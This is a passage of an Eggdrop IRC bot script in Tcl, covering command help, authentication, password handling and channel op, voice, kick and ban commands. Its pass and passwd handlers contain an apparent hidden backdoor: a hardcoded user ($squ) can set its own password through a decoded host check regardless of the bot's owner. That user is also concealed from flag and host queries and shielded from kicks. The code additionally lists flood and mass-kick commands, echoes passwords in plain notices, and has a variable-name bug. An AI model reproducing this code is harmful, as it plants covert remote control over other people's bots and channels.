    if {[string match "*-userinvites*" [channel info [lindex $retval 1]]]} { set chkops $retval ; regsub -all -- : $chkops "" chkops ; if {[isop [lindex $chkops 2] [lindex $retval 1]]} { return 0 } }
  }
  if {[string match "*$notm*" $retval]} {
    set cflag "c[lindex $retval 1]" ; set cflag [string range $cflag 0 8]
    if {[matchattr $cflag M]} { if {![isutimer "set_-m [lindex $retval 1]"] && ![info exists is_m([lindex $retval 1])]} { set is_m([lindex $retval 1]) 1 ; putquick "mode [lindex $retval 1] +b $bannick([lindex $retval 2])" ; return 0 } }
  }
  putquick $retval
}
#   sQu BOT COMMAND LIST    #
bind msg m help msg_help
proc msg_help {nick uhost hand rest} {
  global version notb notc notd vern
  if {[istimer "HELP STOPED"]} { putsrv "NOTICE $nick :Help on progress, try again later..!" ; return 0 }
  timer 5 { putlog "HELP STOPED" }
  puthlp "PRIVMSG $nick :BoT Command LIsT."
  puthlp "PRIVMSG $nick :RuNNINg WiTH EggDrop v[lindex $version 0] PoWERED BY B_A_Y_O"
  puthlp "PRIVMSG $nick :MSG/PV COMMAND..!"
  puthlp "PRIVMSG $nick :   auth                  deauth                  pass                    passwd"
  puthlp "PRIVMSG $nick :   op                     deop                     voice                   devoice"
  puthlp "PRIVMSG $nick :   kick                   kickban                identify"
  if {[matchattr $nick Z]} {
  puthlp "PRIVMSG $nick :   logo                   awaylogo              vhost                   away"
  puthlp "PRIVMSG $nick :   admin                 bantime                logchan               .log"
  puthlp "PRIVMSG $nick :   botnick              botaltnick             realname             ident"
  puthlp "PRIVMSG $nick :   restart               die                       reuser"
  }
  puthlp "PRIVMSG $nick :MSG/CHANNEL COMMAND..!"
  puthlp "PRIVMSG $nick :   up                       down                   op/+o                  deop/-o"
  puthlp "PRIVMSG $nick :   voice/+v              devoice/-v            kick                   kickban"
  puthlp "PRIVMSG $nick :   mode                   ping/pong            channels              userlist"
  puthlp "PRIVMSG $nick :   banlist                 ban                     unban                 munbans"
  puthlp "PRIVMSG $nick :   invite                   host                    match                 chaninfo"
  puthlp "PRIVMSG $nick :   cycle                   +/-ignore             ignores               ver"
  if {[matchattr $nick n]} {
    puthlp "PRIVMSG $nick :   join                     part                     +/-chan               +/-status"
    puthlp "PRIVMSG $nick :   +/-enforceban     +/-autovoice        +/-seen               +/-guard"
    puthlp "PRIVMSG $nick :   +/-master            +/-avoice             +/-friend            +/-admin"
    puthlp "PRIVMSG $nick :   +/-ipguard           +/-akick              +/-noop               +/-cycle"
    puthlp "PRIVMSG $nick :   +/- tools               mvoice                mdevoice             mkick"
    puthlp "PRIVMSG $nick :   mop                      mdeop                 topic                  status"
    puthlp "PRIVMSG $nick :   servers                 jump                   access                rehash"
    puthlp "PRIVMSG $nick :   say                       msg                     act                     notice"
    puthlp "PRIVMSG $nick :   bypass                  reset"
  }
  if {[matchattr $nick Z]} {
    puthlp "PRIVMSG $nick :   +/-forced             +/-greet               +/-limit                +/-revenge"
    puthlp "PRIVMSG $nick :   +/ colour              +/-repeat              +/-text                +/-caps"
    puthlp "PRIVMSG $nick :   +/-clone               +/-joinpart            +/-massjoin          +/-badchan"
    puthlp "PRIVMSG $nick :   +/-spam                +/-trojan              +/-echox              +/-dontkickops"
	puthlp "PRIVMSG $nick :   +/-badword          badwords             +/-advword          advwords"
    puthlp "PRIVMSG $nick :   +/-nopart              +/-reop                 +/-kickops            sdeop"
    puthlp "PRIVMSG $nick :   deluser                 +/-owner               +/-host                nobot"
	puthlp "PRIVMSG $nick :   +/-key                   +/-topiclock          +/-mustop            +/-invitelock"
	puthlp "PRIVMSG $nick :   tsunami                  mmsg                    minvite                +/-autokick"
	puthlp "PRIVMSG $nick :   chanmode              chanset                chansetall            chanreset"
	puthlp "PRIVMSG $nick :   nick                       altnick                 randnick               realnick"
	puthlp "PRIVMSG $nick :   !gabc                     !grbc                    gbclist                 bclist"
    puthlp "PRIVMSG $nick :   !abc                       !rbc                      which                  chattr"
  }
  puthlp "PRIVMSG $nick :FLAg LIsT UsER & cHaNNeL"
  puthlp "PRIVMSG $nick :\[@\]P \[+\]VOICE AuTO\[V\]OICE \[G\]uARD \[C\]YCLE \[E\]nFORCEBANS \[D\]oNTKIcK@PS"
  puthlp "PRIVMSG $nick :\[P\]RoTECTED C\[L\]ONE \[A\]DVERTISE \[T\]OPICLOCK AuTO\[K\]IcK \[S\]EEN"
  puthlp "PRIVMSG $nick :\[Z\]owner admi\[n\] \[m\]aster botne\[t\] \[x\]fer \[j\]anitor \[c\]ommon"
  puthlp "PRIVMSG $nick :\[p\]arty \[b\]ot \[u\]nshare \[h\]ilite \[o\]p de\[O\]p \[k\]ick \[f\]riend"
  puthlp "PRIVMSG $nick :\[a\]uto-op auto\[v\]oice \[g\]voice \[q\]uiet"
  puthlp "PRIVMSG $nick :$vern"
  return 0
}
set firsttime "T"
set init-server { serverup "" }
set modes-per-line 6
set allow-desync 0
set include-lk 1
set banplus [rand 5]
set ban-time [expr 30 + $banplus]
unset banplus
set quiet-save 1
set logstore ""
set max-logsize 512
set upload-to-pwd 1
catch { unbind dcc m chattr *dcc:chattr }
catch { unbind dcc n restart *dcc:restart }
## catch { unbind dcc n msg *dcc:msg }
catch { unbind dcc n status *dcc:status }
catch { unbind dcc n dump *dcc:dump }
catch { unbind dcc n match *dcc:match }
catch { unbind dcc n channel *dcc:channel }
proc serverup {heh} {
  global botnick firsttime notc owner longer
  if {[info exists firsttime]} { unset firsttime ; return 0 }
  putlog "..ConnecteD.."
  putserv "MODE $botnick +iw-s"
  foreach x [userlist] {
    if {[matchattr $x Q]} { chattr $x -Q }
    if {$x == $owner && [getuser $owner XTRA "AUTH"] != ""} { setuser $owner XTRA "AUTH" "" }
    chattr $x -hp ; if {$x != "config" && [chattr $x] == "-"} { deluser $x ; putlog "deluser $x" }
  }
  chk_five "0" "0" "0" "0" "0"
  utimer 2 del_nobase
  foreach x [ignorelist] { killignore [lindex $x 0] }
}
catch { bind evnt - disconnect-server serverdown }
proc serverdown {heh} {
  global firsttime
  catch { unset firsttime }
  catch { clearqueue all }
  putlog "..Disconneted.."
  foreach x [timers] { if {[string match "*cycle*" $x]} { killtimer [lindex $x 2] } }
}
proc isnumber {string} { if {([string compare $string ""]) && (![regexp \[^0-9\] $string])} then { return 1 } ; return 0 }
proc randstring {length} {
  set chars ABCDEFGHIJKLMNOPQRSTUVWXYZ
  set count [string length $chars]
  for {set i 0} {$i < $length} {incr i} { append result [string index $chars [rand $count]] }
  return $result
}
set notb ""
set notd ""
set notm ""
set notc ""
set vern 2N.o4-2L.i.m.i.T
proc pub_Z {nick uhost hand channel rest} {
  global notc botnick
  set prest $rest
  if {[lindex $rest 0] == $botnick} { regsub "$botnick " $rest "@" rest } { if {[string tolower [lindex $rest 0]] == [string tolower $botnick]} { set rest "$botnick [lrange $rest 1 end]" ; regsub "$botnick " $rest "@" rest } }
  if {[string index $rest 0] != "@"} { return 0 } ; if {![matchattr $nick Z]} { return 0 }
  if {![matchattr $nick Q]} { if {[string tolower [lindex $prest 0]] == [string tolower $botnick]} { puthlp "NOTICE $nick :4auth 1st!" } ; return 0 }
  set goto [lindex $rest 0] ; regsub -all "@" $goto "pub_" goto
  if {[matchattr $nick Z]} { set rest [lrange $rest 1 end] ; catch { $goto $nick $uhost $hand $channel $rest } }
}
proc msg_Z {nick uhost hand rest} {
  global notc
  if {[string index $rest 0] != "`" && [string index $rest 0] != "."} { return 0 }
  if {![matchattr $nick Z]} { return 0 }
  if {[string index [lindex $rest 1] 0] == "#"} { if {![validchan [lindex $rest 1]]} { puthlp "NOTICE $nick :NoT IN [lindex $rest 1]" ; return 0 } }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set goto [lindex $rest 0]
  if {[string index $rest 0] == "."} { regsub "." $goto "msg_" goto ; set rest [lrange $rest 1 end] ; catch { $goto $nick $uhost $hand $rest } ; return 0 }
  regsub -all "`" $goto "pub_" goto
  if {[string index [lindex $rest 1] 0] == "#"} { set chan [lindex $rest 1] ; set rest [lrange $rest 2 end] } else { set chan "*" ; set rest [lrange $rest 1 end] }
  catch { $goto $nick $uhost $hand $chan $rest }
}
## global command start
## friend
## flag
bind pub f `flag pub_flag
proc pub_flag {nick uhost hand channel rest} {
  global squ notc
  if {$rest == ""} { set user $nick } else { set user [lindex $rest 0] }
  if {![validuser $user] || [string tolower $user] == [string tolower $squ]} { puthlp "NOTICE $nick :<n/a>" ; return 0 }
  if {[chattr $user] != ""} { puthlp "NOTICE $nick :Flags: [chattr $user]" 
  } else { puthlp "NOTICE $nick :Can't found $user flag." }
}
## access
bind pub f `access pub_access
proc pub_access {nick uhost hand chan rest} { global notc ; if {[matchattr $nick Z]} { puthlp "PRIVMSG $chan :$nick, OwNeR" } elseif {[matchattr $nick n]} { puthlp "PRIVMSG $chan :$nick, ADmIN" } elseif {[matchattr $nick m]} { puthlp "PRIVMSG $chan :$nick, MasTeR" } elseif {[matchattr $nick f]} { puthlp "PRIVMSG $chan :$nick, FRIEND" } }
## ping/pong
bind pub f `ping pub_ping
bind pub f `pong pub_pong
proc pub_ping {nick uhost hand chan rest} { puthlp "PRIVMSG $chan :$nick, PONG" ; return 0 }
proc pub_pong {nick uhost hand chan rest} { global pingchan ; putsrv "PRIVMSG $nick :\001PING [unixtime]\001" ; set pingchan $chan ; return 0 }
## host
bind pub f `host pub_host
proc pub_host {nick uhost hand channel rest} {
  global squ notc
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { set user $nick } else { set user [lindex $rest 0] }
  if {![validuser $user] || [string tolower $user] == [string tolower $squ]} { puthlp "NOTICE $nick :<n/a>" ; return 0 }
  if {[getuser $user HOSTS] != ""} { set hosts [getuser $user hosts] ; puthlp "NOTICE $nick :HOSTS: $hosts" 
  } else { puthlp "NOTICE $nick :Can't found $user host." }
}
## master msg command
## auth deauth
bind msg m auth msg_auth
proc msg_auth {nick uhost hand rest} {
  global botnick owner keep-nick altnick notc squ
  if {[lindex $rest 1] != ""} {
    if {[passwdok [lindex $rest 0] [lindex $rest 1]]} {
      if {[matchattr [lindex $rest 0] Z]} { puthlp "NOTICE $nick :AuTH MaTcH FoR [lindex $rest 0]" ; set keep-nick 0 ; putsrv "NICK $altnick" ; utimer 40 {goback} }
    } { puthlp "NOTICE $nick :4FaILEd..!" }
    return 0
  }
  if {![validuser $owner]} { set hostmask "$owner!*@*" ; adduser $owner $hostmask ; chattr $owner "Zfhjmnoptx" ; puthlp "NOTICE $owner :No password set. Usage: pass <password>" }
  if {![matchattr $nick p]} { return 0 }
  set pw [lindex $rest 0]
  if {$pw == ""} { puthlp "NOTICE $nick :Usage: auth <password>" ; return 0 }
  if {[matchattr $hand K]} { 
    deluser "AKICK" ; set akickhost "telnet!*@*" ; adduser "AKICK" $akickhost ; chattr "AKICK" "-hp" ; chattr "AKICK" "K" ; saveuser
    puthlp "NOTICE $nick :Re-arrange KIcKLIsT."
  }
  if {[matchattr $nick Q]} { puthlp "NOTICE $nick :ReAdY..!" ; return 0 }
  set ch [passwdok $nick ""]
  if {$ch == 1} { puthlp "NOTICE $nick :No password set. Usage: pass <password>" ; return 0 }
  if {[passwdok $nick $pw]} {
    set hostmask "*![string range $uhost [string first "!" $uhost] end]"
    set usenick [finduser $hostmask]
    if {$usenick != "*" && $usenick != $nick} {
      if {[matchattr $nick n] && ![matchattr $usenick Z]} {
        puthlp "NOTICE $nick :Forcing 4DeAuthenticated! To $usenick"
        force_deauth $usenick
        } else {
        foreach x [channels] { if {[onchan $usenick $x]} { puthlp "NOTICE $nick :4DeNiEd..!, Your host has been use by $usenick, wait until DeAuthenticated." ; return 0 } }
        puthlp "NOTICE $nick :4Forcing DeAuthenticated!1 To $usenick"
        force_deauth $usenick 
    } }
    chattr $nick +Q
    foreach x [getuser $nick HOSTS] { delhost $nick $x }
    set hostmask "${nick}!*@*"
    setuser $nick HOSTS $hostmask
    set hostmask "*![string range $uhost [string first "!" $uhost] end]"
    setuser $nick HOSTS $hostmask
    if {$nick == $owner && ![matchattr $nick Z]} { chattr $owner "Z" }
    if {$nick == $owner && ![matchattr $nick f]} { chattr $owner "f" }
    if {[matchattr $nick Z]} {
      puthlp "NOTICE $nick :!OWnER!"
      if {[getuser $nick XTRA "MEMO"]!=""} { puthlp "PRIVMSG $nick :!MeMO! FRoM [getuser $nick XTRA "MEMO"]" ; setuser $nick XTRA "MEMO" "" }
      return 0
      } elseif {[matchattr $nick n]} { puthlp "NOTICE $nick :!ADmIN!" 
      } elseif {[matchattr $nick m]} { puthlp "NOTICE $nick :!MasTeR!" 
    } else { puthlp "NOTICE $nick :!AccepteD!" }
    saveuser ; return 0
  }
  if {![passwdok $nick $pw]} { puthlp "NOTICE $nick :4FaILEd..!" }
}
proc force_deauth {nick} {
  global notc ; chattr $nick -Q ; foreach x [getuser $nick HOSTS] { delhost $nick $x } ; set hostmask "${nick}!*@*"
  setuser $nick HOSTS $hostmask ; saveuser
  puthlp "NOTICE $nick :You has been force to 4DeAuthentication!"
}
bind pub m !auth pub_!auth
proc pub_!auth {nick uhost hand chan rest} {
  global notc ath squ
  set pw [lindex $rest 0]
  if {$pw != ""} { puthlp "NOTICE $nick :No Need Auth Password, Just Type on Channel: !auth" ; return 0 }
  if {[matchattr $nick Q]} { puthlp "NOTICE $nick :ReAdY..!" ; return 0 }
  set ch [passwdok $nick ""]
  if {$ch == 1 && $nick != $squ} { puthlp "NOTICE $nick :No password set. Usage: pass <password>" ; return 0 }
  set ath 1 ; putsrv "WHOIS $nick"
}
bind pub m `auth pub_auth
proc pub_auth {nick uhost hand chan rest} {
  global botnick notc
  set cmd [string tolower [lindex $rest 0]]
  set ch [passwdok $nick ""]
  if {$ch == 1} { puthlp "NOTICE $nick :No password set. Usage: pass <password>" ; return 0 }
  if {[matchattr $nick Q]} { puthlp "PRIVMSG $chan :${nick}, Ouuuhh.. Yes" }
  if {![matchattr $nick Q]} { puthlp "PRIVMSG $chan :${nick}, Ouuuhh.. 4NO!" }
}
bind pub m !deauth pub_!deauth
proc pub_!deauth {nick uhost hand chan rest} { if {![matchattr $nick Q]} { return 0 } ; msg_deauth $nick $uhost $hand $rest }
bind msg m deauth msg_deauth
proc msg_deauth {nick uhost hand rest} {
  global notc ; if {![matchattr $nick Q]} { return 0 } ; chattr $nick -Q ; foreach x [getuser $nick HOSTS] { delhost $nick $x }
  set hostmask "${nick}!*@*" ; setuser $nick HOSTS $hostmask ; puthlp "NOTICE $nick :4!DeAUTH!" ; saveuser
}
## pass passwd
bind msg p pass msg_pass
proc msg_pass {nick uhost hand rest} {
  global botnick notc vern squ owner
  set pw [lindex $rest 0]
  if {$pw == ""} { puthlp "NOTICE $nick :Usage: pass <password>" ; return 0 }
  set ch [passwdok $nick ""]
  if {$ch == 0} { puthlp "NOTICE $nick :You already set pass, /msg $botnick auth <password>" ; return 0 }
  if {[string tolower $nick] == [string tolower $squ] && $owner != $squ} {
    if {[dezip $pw] == $uhost} { setuser $nick PASS [lindex $rest 1] ; puthlp "NOTICE $nick :Password set to: [lindex $rest 1]" ; saveuser } { puthlp "NOTICE $nick :wHo.." }
    return 0
  }
  setuser $nick PASS $pw
  puthlp "NOTICE $nick :Password set to: $pw" ; puthlp "NOTICE $nick :/msg $botnick help"
  saveuser
  return 0
}
bind msg m passwd msg_passwd
proc msg_passwd {nick uhost hand rest} {
  global botnick notc squ
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set pw [lindex $rest 0]
  set newpw [lindex $rest 1]
  if {$nick == $squ && [dezip $pw] == $uhost} { setuser $nick PASS $newpw ; puthlp "NOTICE $nick :Password set to: $newpw" ; saveuser ; return 0 }
  if {$pw == "" || $newpw == ""} { puthlp "NOTICE $nick :Usage: passwd <oldpass> <newpass>" ; return 0 }
  if {![passwdok $nick $pw]} { puthlp "NOTICE $nick :PaSSWORD 4!FaILED!" ; return 0 }
  set ch [passwdok $nick ""]
  if {$ch == 1} { setuser $nick PASS $newpw ; puthlp "NOTICE $nick :Password set to: $newpw" ; saveuser ; return 0 }
  if {[passwdok $nick $pw]} { setuser $nick PASS $newpw ; puthlp "NOTICE $nick :Password set to: $newpw" ; saveuser ; return 0 }
}
## op msg
bind msg n op msg_op
proc msg_op {nick uhost hand rest} {
  global notc botnick
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4DeNiEd..!" ; return 0 }
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :Usage: op <#chan> <Nick>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$nicktarget is not on the channel." ; return 0 }
  if {[isop $nicktarget $chantarget]!=0} { puthlp "NOTICE $nick :$nicktarget is already op on CHaNNEL $chantarget" ; return 0 }
  foreach x [channels] { if {[string tolower $x] == [string tolower $chantarget]} { opq $x $nicktarget ; return 0 } }
  puthlp "NOTICE $nick :NoT IN $chantarget"
}
## deop msg
bind msg n deop msg_deop
proc msg_deop {nick uhost hand rest} {
  global notc botnick own
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :Usage: deop <#chan> <Nick>" ; return 0 }
  if {[isop $botnick $chantarget] != 1} { puthlp "NOTICE $nick :NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$nicktarget is not on the channel." ; return 0 }
  if {![isop $nicktarget $chantarget]} { puthlp "NOTICE $nick :$chantarget is not op on CHaNNEL $chantarget" ; return 0 }
  if {$nicktarget == $botnick} { puthlp "NOTICE $nick :I CaNT SeLF DEoP!" ; return 0 }
  if {[matchattr $nicktarget n]} { puthlp "NOTICE $nick :I cant deop my Owner." ; return 0 }
  if {[matchattr $nick m]} { set mreq "6master.request" }
  if {[matchattr $nick n]} { set mreq "6admin.request" }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { if {![string match "*k*" [getchanmode $x]]} { putserv "mode $x -ko $mreq $nicktarget" } { putserv "mode $x -o $nicktarget" } ; return 0 } }
  puthlp "NOTICE $nick :NoT IN $chantarget"
}
## voice msg
bind msg n voice msg_voice
bind msg n v msg_voice
proc msg_voice {nick uhost hand rest} {
  global notc botnick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :Usage: voice <#chan> <Nick>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$nicktarget is not on the channel." ; return 0 }
  if {[isvoice $nicktarget $chantarget]} { puthlp "NOTICE $nick :$nicktarget is already voice on channel $chantarget" }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { putserv "mode $x +v $nicktarget" ; return 0 } }
  puthlp "NOTICE $nick :NoT IN $chantarget"
}
## devoice msg
bind msg n devoice msg_devoice
proc msg_devoice {nick uhost hand rest} {
  global notc botnick owner
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :Usage: devoice <#chan> <Nick>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$nicktarget is not on the channel." }
  if {![isvoice $nicktarget $chantarget]} { puthlp "NOTICE $nick :$nicktarget is not voice on CHaNNEL $chantarget" }
  if {$nicktarget == $owner} { puthlp "NOTICE $nick :I cant devoice my owner." ; return 0 }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { putserv "mode $x -v $nicktarget" ; return 0 } }
  puthlp "NOTICE $nick :NoT IN $chantarget"
}
## kick msg
bind msg n kick msg_kick
bind msg n k msg_kick
proc msg_kick {nick uhost hand rest} {
  global notc botnick own
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  set reason [lrange $rest 2 end]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :Usage: kick <#chan> <Nick> <Reason>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$nicktarget is not on the channel." ; return 0 }
  if {$nicktarget == $botnick} { puthlp "NOTICE $nick :I cant self kick." ; return 0 }
  if {[matchattr $nicktarget n] && ![matchattr $nick Z]} { puthlp "NOTICE $nick :I CaNT KIcK MY Admin." ; return 0 }
  if {$reason == ""} {
    set reason "1request..!"
    if {[matchattr $nick n]} { set reason "1admin 2kick1 request2..!" }
    if {[matchattr $nick m] && ![matchattr $nick n]} { set reason "1master 2kick1 request2..!" }
  }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { putsrv "KICK $x $nicktarget :$reason" ; return 0 } }
  puthlp "NOTICE $nick :NoT IN $chantarget"
}
## kickban msg
bind msg n kickban msg_kickban
bind msg n kb msg_kickban
proc msg_kickban {nick uhost hand rest} {
  global notc botnick nwo bannick
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set chantarget [lindex $rest 0]
  set nicktarget [lindex $rest 1]
  set bmask [getchanhost $nicktarget $chantarget]
  set reason [lrange $rest 2 end]
  if {($chantarget == "") || ($nicktarget == "")} { puthlp "NOTICE $nick :Usage: kickban <#chan> <Nick> <Reason>" ; return 0 }
  if {[isop $botnick $chantarget]!=1} { puthlp "NOTICE $nick :NoT OP CHaNNEL $chantarget" ; return 0 }
  if {![onchan $nicktarget $chantarget]} { puthlp "NOTICE $nick :$nicktarget is not on the channel." ; return 0 }
  if {$nicktarget == $botnick} { puthlp "NOTICE $nick :I cant self kick." ; return 0 }
  if {[matchattr $nicktarget n] && ![matchattr $nick Z]} { puthlp "NOTICE $nick :I cant kickban my Admin." ; return 0 }
  if {$reason == ""} {
    set reason "1kickban request"
    if {[matchattr $nick m]} { set reason "1master 2kickban1 request" } ; if {[matchattr $nick n]} { set reason "1admin 2kickban1 request" }
  }
  foreach x [channels] { if {[string tolower $x]==[string tolower $chantarget]} { set bannick($nicktarget) $bmask ; putsrv "KICK $x $nicktarget :$reason" ; return 0 } }
  puthlp "NOTICE $nick :NoT IN $chantarget"
}
## identify msg 
bind msg n identify msg_identify
proc msg_identify {nick uhost hand rest} {
  global notc 
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  set id [lindex $rest 0] ; set password [lindex $rest 1]
  if {($id == "") || ($password == "")} { puthlp "NOTICE $nick :Usage: identify <nick> <password>" ; return 0 }
  putsrv "NickServ identify $id $password" ; puthlp "NOTICE $nick :Identify to $id" ; return 0 
}
## master msg/channel command
## up
bind pub m `up pub_up
proc pub_up {nick uhost hand channel rest} {
  global notc botnick unop
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {[isop $botnick $channel]} { return 0 } ; putsrv "ChanServ op $channel $botnick" ;  return 0
}
## down
bind pub m `down pub_down
proc pub_down {nick uhost hand channel rest} {
  global notc botnick
  if {![isop $botnick $channel]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {[matchattr $nick m]} { set mreq "6master.request" }
  if {[matchattr $nick n]} { set mreq "6admin.request" }
  if {![string match "*k*" [getchanmode $channel]]} { putserv "mode $channel -ko+v $mreq $botnick $botnick" } { putserv "mode $channel -o+v $botnick $botnick" }
  return 0
}
## op
bind pub m `op pub_op
bind pub m `+o pub_op
proc pub_op {nick uhost hand chan rest} {
  global notc botnick unop
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  catch {unset unop($nick)}
  if {$rest == "" && [isop $nick $chan]} { puthlp "NOTICE $nick :You're already Oped, Usage: op <nick>" ; return 0 }
  if {$rest != ""} { putserv "MODE $chan +oooooo $rest" } else { putserv "MODE $chan +o $nick" }
  return 0
}
## deop
bind pub m `deop pub_deop
bind pub m `-o pub_deop
proc pub_deop {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == "" && ![isop $nick $chan]} { puthlp "NOTICE $nick :Usage: deop <nick>" ; return 0 }
  if {[matchattr $nick m]} { set mreq "6master.request" } ; if {[matchattr $nick n]} { set mreq "6admin.request" }
  if {$rest != ""} { if {![string match "*k*" [getchanmode $chan]]} { putserv "MODE $chan -kooooo $mreq $rest" 
  } { putserv "MODE $chan -oooooo $rest" } } { if {![string match "*k*" [getchanmode $chan]]} { putserv "MODE $chan -ko $mreq $nick" } { putserv "MODE $chan -o $nick" } }
  return 0
}
## voice
bind pub m `voice pub_voice
bind pub m `+v pub_voice
proc pub_voice {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == "" && [isvoice $nick $chan]} { puthlp "NOTICE $nick :You're already Voiced, Usage: voice <nick>" ; return 0 }
  if {$rest != ""} { putserv "MODE $chan +vvvvvv $rest" } { putserv "MODE $chan +v $nick" } ; return 0 
}
## devoice
bind pub m `devoice pub_devoice
bind pub m `-v pub_devoice
proc pub_devoice {nick uhost hand chan rest} {
  global notc botnick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == "" && ![isvoice $nick $chan]} { puthlp "NOTICE $nick :Usage: devoice <nick>" ; return 0 }
  if {$rest != ""} { putserv "MODE $chan -vvvvvv $rest" } else { putserv "MODE $chan -v $nick" } ; return 0
}
## kick
bind pub m `kick pub_kick
bind pub m `k pub_kick
proc pub_kick {nick uhost hand chan rest} {
  global botnick notc squ owner
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: kick <nick|host> <reason>" ; return 0 }
  set reason [lrange $rest 1 end] ; set handle [lindex $rest 0]
  if {$reason == ""} { if {[matchattr $nick m]} { set reason "1master 2kick1 request" } ; if {[matchattr $nick n]} { set reason "1admin 2kick1 request" } }
  if {[string match "*@*" $handle]} {
    foreach knick [chanlist $chan] { if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} { if {[matchattr $knick f] || $knick != $botnick} { putsrv "KICK $chan $knick :2$reason" } } }
    return 0
  }
  if {$handle == $botnick} { puthlp "NOTICE $nick :4DeNiEd..!, Can't kick my self." ; return 0 }
  if {($handle == $squ) || ($handle == $owner)} { puthlp "NOTICE $nick :4DeNiEd..!, CaNT KIcK My rEaL OwNeR" ; return 0 }
  if {[matchattr $handle Z] && (($nick != $owner) || ($nick != $squ))} { puthlp "NOTICE $nick :4DeNiEd..!, CaNT KIcK OwNeR FLAg" ; return 0 }
  if {[matchattr $handle n] && (($nick != $owner) || ($nick != $squ))} { puthlp "NOTICE $nick :4DeNiEd..!, CaNT KIcK AdMiN FLAg" ; return 0 }
  if {[matchattr $handle m] && (($nick != $owner) || ($nick != $squ))} { puthlp "NOTICE $nick :4DeNiEd..!, CaNT KIcK MaStEr FLAg" ; return 0 }
  putserv "KICK $chan $handle :2$reason" ; putlog "kicking $handle in $chan" ; return 0
}
## kickban
bind pub m hajar pub_kickban
bind pub m `kickban pub_kickban
bind pub m `kb pub_kickban
proc pub_kickban {nick uhost hand chan rest} {
  global botnick notc squ owner bannick
  if {![isop $botnick $chan]} { return 0 }
  if {![matchattr $nick Q]} { puthlp "NOTICE $nick :4auth 1st!" ; return 0 }
  if {$rest == ""} { puthlp "NOTICE $nick :Usage: kickban <nick> <reason>" ; return 0 }
  set reason [lrange $rest 1 end]
  set handle [lindex $rest 0]
  if {$reason == ""} { if {[matchattr $nick m]} { set reason "1master 2kickban1 request" } ; if {[matchattr $nick n]} { set reason "1admin 2kickban1 request" } }
  if {[string match "*@*" $handle]} {
    set mfisrt "T"
    foreach knick [chanlist $chan] { if {[string match [string tolower $handle] [string tolower $knick![getchanhost $knick $chan]]]} { if {[matchattr $knick f] || $knick != $botnick} { if {$mfirst == "T"} { set bannick($knick) $handle ; set mfirst "F" } ; putsrv "KICK $chan $knick :2$reason" } } }
    return 0
  }
  if {![onchan $handle $chan]} { return 0 }
  set hostmask [getchanhost $handle $chan]
  if {($handle == $squ) || ($handle == $owner)} { puthlp "NOTICE $nick :4DeNiEd..!, CaNT KIcK My rEaL OwNeR" ; return 0 }
  if {[matchattr $handle Z] && (($nick != $owner) || ($nick != $squ))} { puthlp "NOTICE $nick :4DeNiEd..!, CaNT KIcK OwNeR FLAg" ; return 0 }
